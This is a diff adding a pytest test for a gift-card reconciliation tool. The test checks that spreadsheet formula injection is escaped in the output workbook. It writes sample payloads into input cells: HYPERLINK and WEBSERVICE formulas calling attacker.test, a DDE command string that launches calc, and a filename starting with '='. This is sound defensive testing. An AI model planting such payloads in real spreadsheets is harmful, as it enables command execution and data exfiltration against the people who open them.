@@ -228,3 +228,64 @@ def create_activity(path: Path, begin: str, end: str, gross_activation: Decimal,
     if void_redemption != 0:
         ws.append(["0005xxxx", 203, "Void Of Redemption", "2026-05-01", None, 5, float(void_redemption), 8056682, 555555])
     wb.save(path)
+
+
+def test_reconciliation_workbook_escapes_untrusted_formula_text(tmp_path: Path):
+    input_dir = tmp_path / "input" / "9354" / "2026-W22"
+    activity_dir = input_dir / "activity"
+    activity_dir.mkdir(parents=True)
+    activity_path = activity_dir / "=1+1 Gift Card Activity.xlsx"
+    create_activity(
+        activity_path,
+        "27-APR-2026",
+        "03-MAY-2026",
+        Decimal("10.00"),
+        Decimal("0.00"),
+        Decimal("-5.00"),
+        Decimal("-3.00"),
+        Decimal("0.00"),
+    )
+
+    wb = load_workbook(activity_path)
+    ws = wb.active
+    malicious_values = {
+        "A5": '=HYPERLINK("http://attacker.test/card","click")',
+        "B5": '=WEBSERVICE("http://attacker.test/request")',
+        "F5": "+cmd|' /C calc'!A0",
+        "H5": "@SUM(1,1)",
+        "I5": "-1+2",
+    }
+    for coordinate, value in malicious_values.items():
+        ws[coordinate] = value
+        ws[coordinate].data_type = "s"
+    wb.save(activity_path)
+
+    (input_dir / "pos_controls.csv").write_text(
+        "store,period,pos_gift_card_issue,pos_gift_card_payment\n9354,2026-W22,10.00,8.00\n",
+        encoding="utf-8",
+    )
+    output_path = tmp_path / "formula-safe.xlsx"
+    main([
+        "--mode", "weekly",
+        "--store", "9354",
+        "--period", "2026-W22",
+        "--period-end", "2026-05-03",
+        "--input-dir", str(input_dir),
+        "--output-file", str(output_path),
+    ])
+
+    out_wb = load_workbook(output_path, data_only=False)
+    formula_cells = [
+        out_wb["Weekly Activity Detail"]["A4"],
+        out_wb["Daily Activity Detail"]["B4"],
+        out_wb["Raw Detail"]["A4"],
+        out_wb["Raw Detail"]["B4"],
+        out_wb["Raw Detail"]["C4"],
+        out_wb["Raw Detail"]["F4"],
+        out_wb["Raw Detail"]["H4"],
+        out_wb["Raw Detail"]["I4"],
+        out_wb["Source Files"]["A4"],
+    ]
+    assert all(cell.data_type == "s" for cell in formula_cells)
+    assert all(str(cell.value).startswith("'") for cell in formula_cells)
+    assert out_wb["Weekly Activity Detail"]["C5"].data_type == "f"
